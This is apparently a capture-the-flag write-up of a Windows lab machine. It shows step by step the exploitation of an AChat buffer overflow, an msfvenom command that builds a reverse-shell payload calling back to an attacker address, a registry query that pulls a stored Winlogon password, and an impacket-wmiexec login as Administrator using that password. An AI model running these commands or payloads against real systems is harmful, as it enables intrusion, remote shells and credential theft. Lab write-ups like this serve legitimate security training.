1. The machine exposes a service running on port 9255 and another one on port 9256. By performing a quick `-I` curl request we discover the server to be `AChat`
```sh
curl -I http://10.129.15.106:9255/
HTTP/1.1 204 No Content
Connection: close
Server: AChat
```
2. By quickly googling online we discover the following Buffer Overflow https://www.exploit-db.com/exploits/36025. We decide to use the command above with `msfvenom` to craft a special payload that gains us a reverse shell, following the instructions set up above
```sh
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.194 LPORT=4444  -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```
3. Finally, we execute the payload and obtain a foothold on the machine
![[attachments/chatterbox-1.png]]
4. Once landed on the target machine, we discover a password saved in the WinLogon
```sh
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
![[attachments/chatterbox-2.png]]
5. We try to authenticate with `impacket-wmiexec` with the `Administrator` user to check for password reuse, escalating to Administrator
```sh
impacket-wmiexec 'Administrator':'Welcome1!'@10.129.15.135
```

>`wmiexec` seems to be the only script that authenticates us as `Administrator` instead of `SYSTEM`
